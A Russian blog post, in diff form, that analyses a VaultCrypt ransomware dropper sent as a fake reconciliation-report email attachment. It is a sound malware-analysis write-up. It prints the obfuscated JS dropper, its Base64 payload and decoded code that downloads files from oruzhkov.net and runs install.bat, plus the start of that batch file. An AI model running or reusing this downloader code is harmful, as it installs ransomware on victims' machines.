@@ -1,0 +1,2386 @@
+﻿#TITLE:Анализ одной из модификаций шифровальщика VaultCrypt
+
+      Привет, хаб!
+На днях (примерно месяц назад) мне достался образец письма с троянцем, рассылаемого по электронной почте. Вообще я не являюсь профессионалом в анализе вредоносных файлов, но в данном случае оказалось, что простейший анализ можно провести и без глубоких знаний.
+Раньше я такого не делал, так что мне стало интересно посмотреть, что же можно отсюда вытянуть. Под катом — разбор кода дроппера и исполняемого bat-файла.TL;DR: под катом — практически построчный разбор довольно большого и муторного BAT-файла. Код, картинки, минимум мыслей.ATTENTION: некоторые антивирусы (в частности, мой Avast!) очень негативно реагируют на приведенные фрагменты JS-кода. При включенном Avast! у меня вместо статьи отображалась пустая страница с сообщением «Соединение было сброшено». Учтите это, если захотите почитать.NB:В попытках понять, что происходит, я провел несколько экспериментов, в результате чего стал счастливым обладателем пятидесяти черновиков постов. И я слишком поздно осознал, что удалить на Хабре черновик невозможно.)1. Деобфускация дроппера
+Итак, вначале было письмо. Текст письма был примерно таким: добрый день, пишет вам бухгалтер ООО «Копыта и рога», прошу вас ознакомиться с прилагаемым актом сверки.
+К письму прикреплено вложение: zip-архив, внутри которого находится js-файл со следующим именем:Акт сверки Июль. Оборотно-сальдовые данные по состоянию на 11.08. Необходимо согласовать в срочном порядке.dос .js
+Вот как выглядело его содержимое://// uxqTUNgSeIQPIzvREL2BBpQKqgkAqK3RnG7HD15SZkPpEc3TNM
+///// uxqTUNgSeIQPIzvREL2BBpQKqgkAqK3RnG7HD15SZkPpEc3TNM
+
+eval(function(d, e, a, c, b, f) {
+  b = function(a) {
+    return (a &lt; e ? "" : b(parseInt(a / e))) + (35 &lt; (a %= e) ? String.fromCharCode(a + 29) : a.toString(36));
+  };
+  ///// 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+///// VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+  if (!"".replace(/^/, String)) {
+    for (;a--;) {
+      f[b(a)] = c[a] || b(a);
+    }
+  ///// 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+///// VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+    c = [function(a) {
+      return f[a];
+    }];
+  ///// 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+///// VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+    b = function() {
+      return "\\w+";
+    };
+    a = 1;
+  }
+  for (;a--;) {
+    c[a] &amp;&amp; (d = d.replace(new RegExp("\\b" + b(a) + "\\b", "g"), c[a]));
+  }
+  ///// 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+///// VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+  return d;
+ ///// 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+///// VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+}
+///// 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+///// VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+('4 3="%j%\\\\";5 7(a){k 8 e(a)}4 9=7("l.m"),3=9.n(3);5 f(a,d){4 b=8 7("o.p"),c=(8 e("q.r.6.0")).s("t");c.u="v.w";c.x=a;c=c.y;b.z=1;b.A();b.B(c);b.C(d,2);b.D()}5 g(a){9.E(a,0,0)}f("F=",""+3+"h.i");g(""+3+"h.i");', 42, 42, "   MT33 var function  CreateObject new JS02     ActiveXObject JS04 JS10 update js temp return WScript Shell ExpandEnvironmentStrings ADODB Stream Msxml2 DOMDocument createElement tmp dataType bin base64 text nodeTypedValue Type Open Write SaveToFile Close Run DQp2YXIgSlMwMz0iJXRlbXAlXFwiOw0KZnVuY3Rpb24gQ3JlYXRlT2JqZWN0KGIpe3JldHVybiBuZXcgQWN0aXZlWE9iamVjdChiKX0NCnZhciBKUzAyPUNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOw0KSlMwMz1KUzAyLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncyhKUzAzKTsNCmZ1bmN0aW9uIGpqKGIsZCl7dmFyIGM9bmV3IEFjdGl2ZVhPYmplY3QoIk1TWE1MMi5YTUxIVFRQIik7Yy5vcGVuKCJHRVQiLGIsMCk7Yy5zZW5kKCk7DQpuZXcgQWN0aXZlWE9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTt2YXIgYT1uZXcgQWN0aXZlWE9iamVjdCgiQURPREIuU3RyZWFtIik7DQphLk9wZW4oKTthLlR5cGU9MTthLldyaXRlKGMuUmVzcG9uc2VCb2R5KTthLlBvc2l0aW9uPTA7YS5TYXZlVG9GaWxlKGQsMik7YS5DbG9zZSgpfQ0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvZG9jLmNzcycsJycrSlMwMysnZG9jLmRvYycpOw0KZnVuY3Rpb24gSlMxMShKUzEyKXtKUzAyLlJ1bihKUzEyLDEsMCk7fQ0KdHJ5IHtKUzExKCcnK0pTMDMrJ2RvYy5kb2MnKTt9DQpjYXRjaChKUzAwNyl7fQ0KZnVuY3Rpb24gSlMxMChKUzEyKXtKUzAyLlJ1bihKUzEyLDAsMCk7fQ0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvZGVzaWduLmNzcycsJycrSlMwMysnZGVzaWduLmNzcycpOw0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvaW5zLmNzcycsJycrSlMwMysnaW5zdGFsbC5iYXQnKTsNCkpTMTAoJycrSlMwMysnaW5zdGFsbC5iYXQnKTs".split(" "), 
+0, {}));
+///// 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+///// VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+///// 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+///// VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+
+Первый мой шаг был достаточно очевиден: убрать комментарии, которые, как видно, не несут никакой смысловой нагрузки. В данном случае файл небольшой, убрать комментарии можно вручную — или же можно воспользоваться регулярными выражениями. Например, во многих текстовых редакторах можно просто заменить на пустую строку все строки, подпадающие под шаблон ^\s*////.*\n (он выберет все строки, которые начинаются с четырех слешей).
+На закуску можно добавить щепотку форматирования.После этого получим следующее:eval(function(d, e, a, c, b, f) {
+  b = function(a) {
+    return (a &lt; e ? "" : b(parseInt(a / e))) + (35 &lt; (a %= e) ? String.fromCharCode(a + 29) : a.toString(36));
+  };
+
+  if (!"".replace(/^/, String)) {
+    for (;a--;) {
+      f[b(a)] = c[a] || b(a);
+    }
+    c = [function(a) {
+      return f[a];
+    }];
+    b = function() {
+      return "\\w+";
+    };
+    a = 1;
+  }
+
+  for (;a--;) {
+    c[a] &amp;&amp; (d = d.replace(new RegExp("\\b" + b(a) + "\\b", "g"), c[a]));
+  }
+
+  return d;
+}
+
+('4 3="%j%\\\\";5 7(a){k 8 e(a)}4 9=7("l.m"),3=9.n(3);5 f(a,d){4 b=8 7("o.p"),c=(8 e("q.r.6.0")).s("t");c.u="v.w";c.x=a;c=c.y;b.z=1;b.A();b.B(c);b.C(d,2);b.D()}5 g(a){9.E(a,0,0)}f("F=",""+3+"h.i");g(""+3+"h.i");',
+ 42,
+ 42,
+ "   MT33 var function  CreateObject new JS02     ActiveXObject JS04 JS10 update js temp return WScript Shell ExpandEnvironmentStrings ADODB Stream Msxml2 DOMDocument createElement tmp dataType bin base64 text nodeTypedValue Type Open Write SaveToFile Close Run DQp2YXIgSlMwMz0iJXRlbXAlXFwiOw0KZnVuY3Rpb24gQ3JlYXRlT2JqZWN0KGIpe3JldHVybiBuZXcgQWN0aXZlWE9iamVjdChiKX0NCnZhciBKUzAyPUNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOw0KSlMwMz1KUzAyLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncyhKUzAzKTsNCmZ1bmN0aW9uIGpqKGIsZCl7dmFyIGM9bmV3IEFjdGl2ZVhPYmplY3QoIk1TWE1MMi5YTUxIVFRQIik7Yy5vcGVuKCJHRVQiLGIsMCk7Yy5zZW5kKCk7DQpuZXcgQWN0aXZlWE9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTt2YXIgYT1uZXcgQWN0aXZlWE9iamVjdCgiQURPREIuU3RyZWFtIik7DQphLk9wZW4oKTthLlR5cGU9MTthLldyaXRlKGMuUmVzcG9uc2VCb2R5KTthLlBvc2l0aW9uPTA7YS5TYXZlVG9GaWxlKGQsMik7YS5DbG9zZSgpfQ0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvZG9jLmNzcycsJycrSlMwMysnZG9jLmRvYycpOw0KZnVuY3Rpb24gSlMxMShKUzEyKXtKUzAyLlJ1bihKUzEyLDEsMCk7fQ0KdHJ5IHtKUzExKCcnK0pTMDMrJ2RvYy5kb2MnKTt9DQpjYXRjaChKUzAwNyl7fQ0KZnVuY3Rpb24gSlMxMChKUzEyKXtKUzAyLlJ1bihKUzEyLDAsMCk7fQ0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvZGVzaWduLmNzcycsJycrSlMwMysnZGVzaWduLmNzcycpOw0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvaW5zLmNzcycsJycrSlMwMysnaW5zdGFsbC5iYXQnKTsNCkpTMTAoJycrSlMwMysnaW5zdGFsbC5iYXQnKTs".split(" "),
+ 0,
+ {}));
+
+Окей — стало получше, хоть и не сильно. :)
+Что мы видим? Самой первой идет функция eval() — выполнить код. Какой код? Который вернет нам функция function(d, e, a, c, b, f). Откуда она берет параметры? А они указаны сразу после объявления функции. Все шесть штук — с a по f — в наличии:('4 3="%j%\\\\";5 7(a) &lt;....&gt;,
+ 42,
+ 42,
+ "   MT33 var function  CreateObject  &lt;....&gt;,
+ 0,
+ {})
+
+Повкуривав код пару минут, я неожиданно вспомнил, что мозгов-то у меня ведь и нет, и решил попробовать пойти по пути наименьшего сопротивления.
+Видно, что обфусцированный код содержится в четвертом параметре. Вначале идут упоминания переменных и функций, а затем — довольно объемная «портянка» — похоже, закодированная в Base64.Хм. А что, если...
+Bingo! У нас есть код. Прекрасный обфускатор использован, побольше бы таких. :)NB:Однако не всегда все так шоколадно. Буквально через несколько часов посыпалась другая рассылка: схожий текст письма, схожий js-файл во вложении — но там уже был применен другой обфускатор, без сладкой халявы в виде Base64.Если интересно - он выглядел так:// 59d3ce34148c30ca34d7c7a66638ae5c0292edd4c9c022663364f87adf190adc
+//// cb138ea5c1bfe3ab5c876e3cb1582344
+///// 0292edd4c9c022663364f87adf190adccb138ea5c1bfe3ab5c876e3cb15823445
+eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function()
+// 59d3ce34148c30ca34d7c7a66638ae5c0292edd4c9c022663364f87adf190adc
+///// 0292edd4c9c022663364f87adf190adccb138ea5c1bfe3ab5c876e3cb15823445
+{return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1E 14=["\\18\\a\\I\\19\\A\\1y\\Z\\1y\\1l\\1l\\A\\15\\y\\a\\12\\U\\c\\V\\1s\\W\\a\\1t\\a\\g\\U\\c\\V\\1q\\18\\a\\G\\19\\12\\U\\A\\d\\M\\o\\A\\V\\1f\\I\\19\\G\\M\\n\\U\\I\\V\\15\\y\\a\\1d\\U\\c\\1f\\s\\V\\1s\\18\\a\\q\\19\\1t\\a\\12\\U\\A\\T\\M\\m\\A\\V\\1f\\b\\19\\U\\1t\\a\\g\\U\\A\\1r\\M\\L\\M\\1c\\M\\j\\A\\V\\V\\M\\R\\U\\A\\h\\A\\V\\15\\b\\M\\p\\19\\A\\O\\M\\P\\A\\15\\b\\M\\1a\\19\\c\\15\\b\\19\\b\\M\\f\\15\\q\\M\\u\\19\\16\\15\\q\\M\\10\\U\\V\\15\\q\\M\\1h\\U\\b\\V\\15\\q\\M\\v\\U\\s\\1f\\B\\V\\15\\q\\M\\Y\\U\\V\\1q\\y\\a\\X\\U\\c\\V\\1s\\G\\M\\N\\U\\c\\1f\\j\\1f\\j\\V\\1q\\1d\\U\\A\\17\\A\\1f\\A\\A\\1j\\I\\1j\\A\\D\\M\\i\\A\\V\\15\\X\\U\\A\\A\\1j\\I\\1j\\A\\D\\M\\i\\A\\V\\15","\\a","\\R\\m\\d\\i\\h","\\a\\a\\a\\k\\C\\I\\I\\a\\O\\c\\L\\a\\1d\\p\\n\\b\\h\\i\\T\\n\\a\\a\\v\\L\\g\\c\\h\\g\\1b\\q\\Z\\g\\b\\h\\a\\n\\g\\P\\a\\H\\Q\\j\\B\\a\\a\\a\\a\\a\\10\\b\\h\\i\\O\\g\\w\\1b\\q\\Z\\g\\b\\h\\a\\H\\Q\\j\\18\\a\\H\\Q\\16\\j\\a\\p\\m\\s\\c\\h\\g\\a\\Z\\R\\a\\h\\g\\o\\m\\a\\L\\g\\h\\p\\L\\n\\a\\x\\Q\\b\\L\\i\\m\\h\\a\\Q\\D\\g\\d\\d\\a\\N\\1a\\m\\c\\n\\s\\N\\n\\O\\i\\L\\T\\n\\o\\g\\n\\h\\Q\\h\\L\\i\\n\\X\\R\\a\\10\\Y\\1b\\Y\\1h\\a\\Q\\h\\L\\g\\c\\o\\a\\k\\R\\1a\\o\\d\\B\\a\\Y\\1b\\k\\Y\\T\\b\\p\\o\\g\\n\\h\\a\\b\\L\\g\\c\\h\\g\\N\\d\\g\\o\\g\\n\\h\\a\\h\\o\\m\\a\\s\\c\\h\\c\\C\\f\\m\\g\\a\\q\\i\\n\\a\\q\\c\\R\\g\\1c\\18\\a\\h\\g\\1a\\h\\a\\n\\T\\s\\g\\C\\f\\m\\g\\s\\r\\c\\d\\p\\g\\a\\C\\f\\m\\g\\a\\1b\\m\\g\\n\\a\\x\\L\\i\\h\\g\\a\\Q\\c\\O\\g\\C\\T\\17\\i\\d\\g\\a\\v\\d\\T\\R\\g\\a\\J\\p\\n\\a\\Y\\E\\m\\B\\z\\w\\11\\X\\Q\\d\\k\\P\\k\\u\\j\\i\\H\\w\\J\\d\\q\\w\\10\\d\\w\\17\\P\\i\\1b\\P\\j\\e\\l\\n\\r\\p\\z\\I\\J\\m\\q\\B\\18\\X\\E\\I\\H\\d\\z\\w\\J\\d\\C\\B\\H\\1r\\l\\x\\13\\j\\e\\t\\11\\m\\g\\I\\H\\d\\s\\1e\\r\\f\\q\\i\\1h\\p\\l\\w\\b\\X\\E\\x\\13\\j\\c\\w\\l\\d\\x\\N\\G\\i\\c\\o\\r\\Z\\s\\v\\D\\i\\e\\w\\j\\13\\v\\n\\l\\D\\b\\i\\1h\\e\\F\\u\\10\\f\\1k\\F\\13\\f\\l\\x\\17\\j\\l\\F\\G\\i\\c\\o\\r\\Z\\s\\v\\X\\i\\r\\16\\13\\Z\\b\\o\\d\\P\\s\\v\\y\\C\\c\\t\\r\\R\\q\\v\\11\\m\\1b\\P\\j\\e\\Q\\d\\k\\P\\k\\u\\16\\e\\F\\u\\10\\f\\K\\W\\r\\18\\b\\t\\17\\p\\l\\N\\r\\p\\s\\o\\d\\f\\q\\B\\y\\h\\l\\x\\y\\j\\F\\I\\J\\f\\c\\x\\y\\n\\b\\f\\D\\e\\F\\u\\10\\u\\e\\C\\R\\13\\v\\o\\l\\16\\q\\o\\13\\j\\c\\x\\G\\p\\11\\t\\m\\1r\\e\\t\\11\\R\\l\\v\\d\\12\\s\\o\\17\\f\\11\\t\\k\\G\\q\\o\\r\\I\\11\\N\\17\\Z\\s\\t\\d\\B\\l\\r\\D\\1k\\z\\o\\m\\d\\z\\I\\E\\T\\11\\W\\16\\C\\x\\N\\16\\k\\k\\i\\y\\z\\C\\F\\1a\\11\\r\\17\\J\\E\\11\\i\\W\\12\\z\\f\\y\\O\\b\\t\\r\\p\\e\\v\\H\\1e\\J\\r\\E\\i\\K\\t\\11\\R\\k\\v\\W\\12\\z\\f\\y\\u\\l\\x\\y\\W\\e\\v\\W\\12\\Y\\E\\m\\p\\l\\w\\b\\X\\E\\x\\13\\j\\c\\w\\l\\d\\x\\N\\G\\i\\c\\o\\r\\Z\\s\\v\\X\\i\\F\\B\\13\\f\\c\\w\\1h\\j\\c\\x\\y\\n\\K\\W\\l\\m\\q\\t\\r\\C\\g\\w\\13\\j\\l\\x\\16\\1k\\z\\o\\m\\d\\z\\I\\E\\i\\e\\C\\h\\B\\z\\w\\11\\X\\z\\C\\16\\p\\l\\w\\b\\X\\E\\x\\13\\j\\c\\w\\l\\d\\x\\N\\G\\i\\c\\o\\r\\Z\\s\\v\\X\\i\\E\\F\\J\\1k\\J\\N\\11\\p\\F\\I\\J\\f\\l\\x\\17\\h\\11\\i\\W\\12\\Y\\E\\m\\D\\K\\W\\G\\P\\l\\x\\18\\T\\e\\C\\h\\D\\K\\d\\J\\y\\b\\t\\F\\G\\k\\C\\h\\D\\K\\d\\s\\f\\c\\w\\J\\d\\e\\t\\k\\p\\F\\o\\r\\u\\b\\t\\G\\p\\b\\B\\r\\v\\q\\B\\J\\y\\e\\C\\h\\D\\K\\d\\1h\\O\\b\\B\\d\\j\\c\\x\\G\\p\\1k\\C\\10\\12\\z\\Q\\y\\C\\z\\w\\l\\d\\r\\t\\G\\t\\c\\x\\1a\\d\\e\\t\\E\\R\\k\\i\\W\\12\\z\\Q\\y\\Y\\q\\t\\G\\u\\l\\Q\\X\\m\\1d\\E\\j\\e\\c\\o\\T\\T\\H\\B\\D\\j\\s\\1e\\10\\1c\\K\\f\\G\\O\\b\\n\\r\\1c\\c\\t\\h\\O\\s\\i\\y\\p\\l\\w\\E\\O\\l\\t\\G\\Z\\K\\o\\13\\u\\b\\f\\b\\R\\H\\f\\b\\L\\Q\\d\\k\\P\\k\\f\\R\\n\\l\\t\\G\\Z\\K\\o\\J\\O\\z\\f\\b\\m\\1b\\P\\j\\e\\l\\n\\r\\p\\z\\I\\J\\m\\q\\B\\18\\X\\Q\\d\\k\\1a\\k\\Q\\D\\e\\F\\u\\N\\f\\e\\w\\h\\e\\F\\u\\10\\f\\K\\d\\H\\16\\q\\i\\D\\e\\F\\u\\N\\f\\K\\Y\\N\\R\\k\\v\\W\\12\\1d\\E\\j\\e\\s\\1e\\H\\y\\11\\1e\\h\\e\\F\\u\\N\\1a\\e\\v\\b\\n\\e\\j\\m\\C\\k\\Y\\k\\L\\H\\B\\J\\O\\z\\f\\y\\W\\q\\B\\k\\n\\e\\C\\h\\G\\Y\\E\\m\\Z\\z\\w\\J\\Z\\c\\v\\D\\e\\F\\u\\10\\P\\13\\f\\d\\12\\1d\\E\\j\\e\\l\\n\\r\\p\\z\\I\\J\\m\\q\\B\\18\\X\\Q\\d\\k\\1a\\k\\v\\D\\e\\F\\u\\N\\f\\e\\w\\h\\e\\F\\u\\10\\f\\K\\d\\H\\16\\q\\i\\D\\e\\F\\u\\N\\f\\K\\Y\\10\\R\\k\\v\\W\\12\\1d\\E\\j\\e\\c\\o\\T\\T\\H\\B\\D\\j\\s\\1e\\10\\1c\\K\\f\\G\\O\\b\\n\\r\\1c\\c\\t\\h\\O\\s\\i\\y\\p\\l\\w\\E\\O\\l\\t\\r\\u\\c\\x\\s\\p\\K\\o\\13\\u\\b\\f\\b\\R\\H\\f\\b\\L\\Q\\d\\k\\P\\k\\f\\R\\n\\l\\t\\r\\u\\c\\x\\s\\p\\K\\o\\13\\u\\b\\f\\b\\m\\1b\\P\\j\\e\\c\\o\\T\\T\\H\\B\\D\\j\\s\\1e\\10\\1c\\K\\f\\G\\O\\b\\n\\r\\1c\\c\\t\\h\\O\\s\\i\\y\\p\\l\\w\\E\\O\\c\\x\\y\\u\\k\\i\\y\\Z\\b\\I\\k\\n\\K\\v\\b\\n\\e\\j\\m\\C\\k\\Y\\k\\L\\H\\B\\d\\p\\b\\I\\J\\D\\q\\t\\P\\p\\z\\o\\17\\j\\H\\f\\W\\12\\Y\\E\\m\\e\\F\\u\\N\\P\\e\\v\\b\\n\\e\\j\\m\\C\\k\\Y\\k\\L\\H\\B\\d\\p\\b\\I\\J\\D\\q\\t\\P\\p\\z\\o\\17\\j\\H\\f\\W\\12","","\\1d\\L\\T\\o\\v\\D\\c\\L\\v\\T\\s\\g","\\L\\g\\m\\d\\c\\b\\g","\\1l\\P\\1j","\\1l\\q","\\X"];1F(1n(1m,1o,S,1i,1g,1u){1g=1n(S){1p(S&lt;1o?14[4]:1g(1B(S/1o)))+(1C&lt;(S%=1o)?1v[14[5]](S+1I):S.1A(1z))};1D(!14[4][14[6]](/^/,1v)){1x(;S--;){1u[1g(S)]=1i[S]||1g(S)};1i=[1n(S){1p 1u[S]}];1g=1n(){1p 14[7]};S=1};1x(;S--;){1i[S]&amp;&amp;(1m=1m[14[6]](1G 1H(14[8]+1g(S)+14[8],14[9]),1i[S]))};1p 1m}(14[0],1w,1w,14[3][14[2]](14[1]),0,{}));',62,107,'||||||||||x20|x63|x61|x6C|x4B|x79|x65|x74|x69|x30|x4D|x5A|x70|x6E|x6D|x75|x62|x56|x64|x47|x7A|x43|x58|x57|x35|x59|x22|x32|x54|x68|x51|x55|x39|x4A|x33|x52|x4C|x72|x2E|x45|x76|x77|x53|x73|_0x3283x3|x6F|x28|x29|x6B|x67|x44|x6A|x41|x49|x37|x4E|_0x32db|x3B|x31|x46|x34|x3D|x78|x4F|x36|x66|x48|x2C|_0x3283x5|x42|_0x3283x4|x2B|x50|x5C|_0x3283x1|function|_0x3283x2|return|x7D|x71|x7B|x38|_0x3283x6|String|42|for|x25|36|toString|parseInt|35|if|var|eval|new|RegExp|29'.split('|'),0,{})
+  
+// 59d3ce34148c30ca34d7c7a66638ae5c0292edd4c9c022663364f87adf190adc
+//// cb138ea5c1bfe3ab5c876e3cb1582344
+///// 0292edd4c9c022663364f87adf190adccb138ea5c1bfe3ab5c876e3cb15823445
+)
+// 59d3ce34148c30ca34d7c7a66638ae5c0292edd4c9c022663364f87adf190adc
+
+Что же, это тоже легко можно расшифровать: открываем код в абсолютно любом текстовом редакторе, меняем eval() на console.log() и запускаем получившееся в JS-консоли броузера — например, в Firefox.
+Само собой, такую же операцию можно провернуть и с исходным js-файлом из начала этой статьи.Как-то так (кликабельно):
+В нижней части экрана — интересующий нас код.
+Весь код записан в одну строку. Чтобы привести его в читаемое состояние, в данном случае можно просто заменить ";" (точку с запятой) на ";\n" (точку с запятой и перенос строки).
+Ну и вновь приправить форматированием.Код, раскодирующий и запускающий ядро дроппера:var MT33 = "%temp%\\";
+
+function CreateObject(a){
+  return new ActiveXObject(a)
+}
+var JS02 = CreateObject("WScript.Shell"),
+  MT33 = JS02.ExpandEnvironmentStrings(MT33);
+
+function JS04(a, d){
+  var b = new CreateObject("ADODB.Stream"),
+    c = (new ActiveXObject("Msxml2.DOMDocument.6.0")).createElement("tmp");
+  c.dataType = "bin.base64";
+  c.text = a;
+  c = c.nodeTypedValue;
+  b.Type = 1;
+  b.Open();
+  b.Write(c);
+  b.SaveToFile(d, 2);
+  b.Close()
+}
+
+function JS10(a){
+  JS02.Run(a, 0, 0)
+}
+
+JS04("DQp2YXIgSlMwMz0iJXRlbXAlXFwiOw0KZnVuY3Rpb24gQ3JlYXRlT2JqZWN0KGIpe3JldHVybiBuZXcgQWN0aXZlWE9iamVjdChiKX0NCnZhciBKUzAyPUNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOw0KSlMwMz1KUzAyLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncyhKUzAzKTsNCmZ1bmN0aW9uIGpqKGIsZCl7dmFyIGM9bmV3IEFjdGl2ZVhPYmplY3QoIk1TWE1MMi5YTUxIVFRQIik7Yy5vcGVuKCJHRVQiLGIsMCk7Yy5zZW5kKCk7DQpuZXcgQWN0aXZlWE9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTt2YXIgYT1uZXcgQWN0aXZlWE9iamVjdCgiQURPREIuU3RyZWFtIik7DQphLk9wZW4oKTthLlR5cGU9MTthLldyaXRlKGMuUmVzcG9uc2VCb2R5KTthLlBvc2l0aW9uPTA7YS5TYXZlVG9GaWxlKGQsMik7YS5DbG9zZSgpfQ0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvZG9jLmNzcycsJycrSlMwMysnZG9jLmRvYycpOw0KZnVuY3Rpb24gSlMxMShKUzEyKXtKUzAyLlJ1bihKUzEyLDEsMCk7fQ0KdHJ5IHtKUzExKCcnK0pTMDMrJ2RvYy5kb2MnKTt9DQpjYXRjaChKUzAwNyl7fQ0KZnVuY3Rpb24gSlMxMChKUzEyKXtKUzAyLlJ1bihKUzEyLDAsMCk7fQ0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvZGVzaWduLmNzcycsJycrSlMwMysnZGVzaWduLmNzcycpOw0KamooJ2h0dHA6Ly9vcnV6aGtvdi5uZXQvaW5zLmNzcycsJycrSlMwMysnaW5zdGFsbC5iYXQnKTsNCkpTMTAoJycrSlMwMysnaW5zdGFsbC5iYXQnKTs=", "" + MT33 + "update.js");
+
+JS10("" + MT33 + "update.js");
+
+Код на удивление несложный: он получает путь к папке %temp%, затем раскодирует основную часть загрузчика (дроппера) из Base64 и помещает полученный код в файл %temp%\update.js. После этого вредоносный файл запускается на выполнение функцией WScript.Shell.Run().
+P. S. Совершенно непонятно, зачем мы все это сейчас проделали — ведь у нас уже есть раскодированный код…
+Ну ладно, пусть будет. :)2. Анализ дроппера
+Итак, мы успешно раскодировали из Base64 основной код дроппера.Узрим же его!var JS03 = "%temp%\\";
+
+function CreateObject(b){
+return new ActiveXObject(b)
+}
+
+var JS02 = CreateObject("WScript.Shell");
+
+JS03 = JS02.ExpandEnvironmentStrings(JS03);
+
+function jj(b, d){
+  var c = new ActiveXObject("MSXML2.XMLHTTP");
+  c.open("GET", b, 0);
+  c.send();
+  new ActiveXObject("Scripting.FileSystemObject");
+  var a = new ActiveXObject("ADODB.Stream");
+  a.Open();
+  a.Type = 1;
+  a.Write(c.ResponseBody);
+  a.Position = 0;
+  a.SaveToFile(d, 2);
+  a.Close()
+}
+
+jj('http://oruzhkov.net/doc.css','' + JS03 + 'doc.doc');
+
+function JS11(JS12){
+  JS02.Run(JS12, 1, 0);
+}
+
+try {
+  JS11('' + JS03 + 'doc.doc');
+}
+catch(JS007){
+}
+
+function JS10(JS12){
+  JS02.Run(JS12, 0, 0);
+}
+
+jj('http://oruzhkov.net/design.css','' + JS03 + 'design.css');
+
+jj('http://oruzhkov.net/ins.css','' + JS03 + 'install.bat');
+
+JS10(''+JS03+'install.bat');
+
+Код, опять-таки, весьма несложный; единственное, что немного напрягает, — это непонятные имена переменных. Общий смысл происходящего таков:создать объект WScript;
+получить полный путь к папке %temp%;
+скачать с сервера злоумышленника файл doc.doc и сохранить его под тем же именем в папку %temp%;
+попытаться открыть doc.doc;
+скачать с сервера злоумышленника файл design.css и сохранить его под тем же именем в папку %temp%;
+скачать с сервера злоумышленника файл ins.css и сохранить его под именем install.bat в папку %temp%;
+запустить install.bat.
+
+Образцы скачиваемых файлов можно скачать непосредственно с официального сайта дистрибьютора (уже недоступен) или взять здесь (должно быть доступно ближайшие пару месяцев, потом сотрется; пароль к архиву — «virus»).
+Файл doc.doc — это, похоже, обычный документ MS Word (по крайней мере, навскидку ничего вредоносного я в нем не нашел). После открытия пользователь увидит следующее:Ваша версия Word устарела!
+Файл design.css — это на самом деле gpg.exe, утилита для шифрования сообщений и файлов.
+А файл ins.css (install.bat) — это собственно главный исполняемый файл троянца.3. Деобфускация исполняемого файла
+Исходное содержимое файла install.bat приведено под спойлером. Кода довольно много (примерно 850 строк), так что этот спойлер лучше вообще не открывать — дальше будет приведена укороченная версия.Код (850 строк мути):echo uxqTUNgSeIQPIzvREL2BBpQKqgkAqK3RnG7HD15SZkPpEc3TNM
+echo uxqTUNgSeIQPIzvREL2BBpQKqgkAqK3RnG7HD15SZkPpEc3TNM
+
+@ECHO OFF
+
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+SetLocal EnableDelayedExpansion
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+cd "%TEMP%"
+if not exist "%temp%\9480bf43.76a94786" (
+echo b4Ga5r573nErUJaHejudevuRuTaChUbr &gt;nul
+echo BeQedRu54GUtra5aYEdeseTe2R4wruv6 &gt;nul
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+echo 871c371d &gt; "%temp%\9480bf43.76a94786"
+echo b4Ga5r573nErUJaHejudevuRuTaChUbr &gt;nul
+echo BeQedRu54GUtra5aYEdeseTe2R4wruv6 &gt;nul
+attrib +s +h "%temp%\9480bf43.76a94786"
